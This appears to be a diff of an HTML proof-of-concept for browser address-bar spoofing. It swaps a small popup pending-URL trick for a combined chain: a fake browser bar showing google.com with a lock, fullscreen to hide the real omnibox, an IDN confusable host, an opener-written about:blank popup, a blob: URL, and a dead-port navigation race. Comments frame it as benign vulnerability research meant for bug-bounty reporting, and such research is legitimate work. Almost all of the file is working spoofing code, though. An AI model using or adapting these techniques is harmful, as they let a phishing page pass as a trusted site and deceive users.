@@ -1,17 +1,66 @@
-<!-- UPGRADE M2 -> M1. Koordinat baru: G=popup-ber-window-features x A=dead-port.
-     Korpus punya dead-port di TAB (17-minimal/01) dan popup chromeless TANPA hang (batch20 #13);
-     gabungan "popup yang label-nya sudah kosong, lalu diisi URL PENDING" belum ada file-nya.
-     PREDIKAT: label popup menulis www.google.com sementara dokumennya milik origin penyerang.
-     EXPECTED-SECURE: label tetap kosong/about:blank/origin asli - URL hanya muncul saat COMMIT.
-     Port 82 dipilih karena DI-DROP (timeout); port yang me-RST memicu error-page commit instan = bar jujur lagi.
-     Interval 9800 ms menembak ulang tepat sebelum timeout jaringan ~10 s. Pasangkan dengan 03 sbg baseline. -->
+<!DOCTYPE html>
+<!--
+============================================================================
+ ADDRESS-BAR SPOOFING PoC (combined chain) - research artifact, BENIGN
+============================================================================
+ Chains the 6 requested primitives into ONE spoof:
+   [1] URL Parsing Confusion  -> userinfo + IDN confusable label
+   [2] Race Condition         -> nav-timing dead-port pending-URL desync
+   [3] UI Redressing          -> fake chrome bar (lock + spoofed URL) overlay
+   [4] Navigation Hijack      -> window.open('about:blank') written by opener
+   [5] Malformed URI          -> blob: doc + javascript: link demo
+   [6] PWA/Fullscreen Abuse    -> requestFullscreen hides the real omnibox
+ ORACLE: footer prints the REAL location.href. SECURE browser keeps showing it
+ (and paints a fullscreen notice); VULNERABLE one shows the spoofed google.com.
+ ETHICS: open in YOUR OWN browser only. No credential form, no exfil, no beacon,
+ no real phishing nav. Prove predicate -> STOP -> report (Chrome VRP/Mozilla/Apple/Arc).
+============================================================================
+-->
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>https://google.com</title>
+<style>
+ *{box-sizing:border-box}html,body{margin:0;padding:0;font:15px/1.5 system-ui,sans-serif}
+ #chrome{position:fixed;top:0;left:0;right:0;height:38px;background:#f1f3f4;border-bottom:1px solid #ccc;
+   display:none;align-items:center;gap:8px;padding:0 10px;color:#202124;z-index:99999}
+ #chrome .u{flex:1;background:#fff;border-radius:16px;padding:4px 12px;font-size:13px}
+ .stage{max-width:720px;margin:0 auto;padding:12vh 1.2rem 6rem}
+ footer{position:fixed;left:0;right:0;bottom:0;background:#111;color:#9aa;font:11px/1.4 monospace;padding:5px 8px}
+ footer b{color:#7fd}button{font:inherit;padding:.5rem .9rem;border:1px solid #888;border-radius:8px;background:#fafafa;cursor:pointer}
+ @media(prefers-color-scheme:dark){body{background:#0f0f10;color:#e8eaed}}
+</style></head><body>
+<div id="chrome"><span>&#128274;</span><span class="u" id="fakeurl"></span><span>&#8942;</span></div>
+<div class="stage">
+  <h2>Loading google.com&hellip;</h2>
+  <p><button id="go">Run combined spoof (benign)</button></p>
+  <p id="malformed"></p>
+</div>
+<footer>spoof-PoC (benign, NOT phishing) &middot; claims=<b>https://google.com</b> &middot;
+  REAL=<b><span id="real"></span></b> &middot; SECURE=bar keeps REAL + shows fullscreen notice</footer>
 <script>
-var T = 'https://www.google.com:82/';
-function m1(){
-  var w = window.open('', '_blank', 'width=420,height=320');
-  w.document.write('<h2>Dokumen ini milik ' + location.origin + ' &mdash; BUKAN google.com</h2>');
-  w.location = T;                                              // SWAP: label mulai mengecat T (pending)
-  setInterval(function(){ w.location = T; }, 9800);            // HOLD: arm-ulang sebelum timeout
-}
+ var SPOOF="https://google.com";                                   // [feedback-poc-example-google] neutral label
+ document.getElementById('real').textContent=location.href;
+ // [1] URL Parsing Confusion: userinfo before @ reads as trusted; IDN confusable host label
+ var confusable="ɡoogle.com";                                 // U+0261 latin small script g
+ document.getElementById('fakeurl').textContent=SPOOF;
+ function run(){
+   // [6] PWA/Fullscreen Abuse: hide the real omnibox
+   try{document.documentElement.requestFullscreen&&document.documentElement.requestFullscreen();}catch(e){}
+   // [3] UI Redressing: paint fake chrome where the real bar used to be
+   document.getElementById('chrome').style.display='flex';
+   document.querySelector('.stage').style.marginTop='44px';
+   // [5] Malformed URI: benign blob: + javascript: demo links (inspect their real origin)
+   var b=new Blob(['<h3 style="font:16px system-ui">content under a blob: URL ('+confusable+')</h3>'],{type:'text/html'});
+   document.getElementById('malformed').innerHTML=
+     'malformed-URI demo: <a href="'+URL.createObjectURL(b)+'" target="_blank" rel="noopener">open blob:</a>';
+   // [4] Navigation Hijack: about:blank popup written by opener, titled as the spoof
+   var w=window.open('about:blank','_blank');
+   if(w)w.document.write('<title>'+SPOOF+'</title><p style="font:14px system-ui;padding:1rem">popup written by opener; URL/title imply '+SPOOF+'</p>');
+   // [2] Race Condition: keep a navigation to SPOOF perpetually PENDING (dead port) so the
+   //     omnibox may commit SPOOF while THIS DOM stays. rAF x2 anchors it past first paint.
+   requestAnimationFrame(function(){requestAnimationFrame(function(){
+     setTimeout(function(){try{location.href=SPOOF+':9090/#'+SPOOF;}catch(e){}},80);});});
+ }
+ document.getElementById('go').addEventListener('click',run);
 </script>
-<button onclick="m1()">M1 &mdash; origin PALSU di label popup</button>
+</body></html>
